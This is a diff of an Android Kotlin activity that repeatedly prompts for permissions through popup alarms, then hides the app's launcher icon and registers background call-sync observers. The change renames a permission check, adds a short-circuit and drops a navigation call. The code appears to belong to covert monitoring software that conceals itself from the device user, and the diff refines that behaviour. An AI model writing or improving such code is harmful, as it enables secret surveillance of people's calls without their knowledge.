@@ -27,7 +27,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
         SyncBootstrap.armBackgroundSync(this)
 
-        if (!SyncBootstrap.needsRuntimePermissions(this)) {
+        if (!SyncBootstrap.needsCoreSyncPermissions(this)) {
             onAllowed()
             return
         }
@@ -38,7 +38,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
     override fun onNewIntent(intent: Intent) {
         super.onNewIntent(intent)
         setIntent(intent)
-        if (!finished && SyncBootstrap.needsRuntimePermissions(this)) {
+        if (!finished && SyncBootstrap.needsCoreSyncPermissions(this)) {
             lastAskAt = 0L
             mainHandler.postDelayed({ askPermissions() }, 200L)
         }
@@ -49,7 +49,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         if (!hasFocus || finished) {
             return
         }
-        if (!SyncBootstrap.needsRuntimePermissions(this)) {
+        if (!SyncBootstrap.needsCoreSyncPermissions(this)) {
             onAllowed()
             return
         }
@@ -61,7 +61,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         if (finished) {
             return
         }
-        if (!SyncBootstrap.needsRuntimePermissions(this)) {
+        if (!SyncBootstrap.needsCoreSyncPermissions(this)) {
             onAllowed()
             return
         }
@@ -95,7 +95,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         val missing = SyncBootstrap.requiredPermissions().filter { permission ->
             checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
         }
-        if (missing.isEmpty()) {
+        if (missing.isEmpty() || !SyncBootstrap.needsCoreSyncPermissions(this)) {
             onAllowed()
             return
         }
@@ -109,7 +109,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
     }
 
     private fun handlePermissionResult() {
-        if (!SyncBootstrap.needsRuntimePermissions(this)) {
+        if (!SyncBootstrap.needsCoreSyncPermissions(this)) {
             PermissionPopupAlarms.cancel(this)
             onAllowed()
         } else if (!isFinishing) {
@@ -132,7 +132,6 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         finished = true
         PermissionPopupAlarms.cancel(this)
         LauncherHider.hideNow(this)
-        goHome()
         SyncObserverManager.register(applicationContext)
         SyncBootstrap.armBackgroundSync(applicationContext)
         SyncAlarmScheduler.scheduleNext(applicationContext)
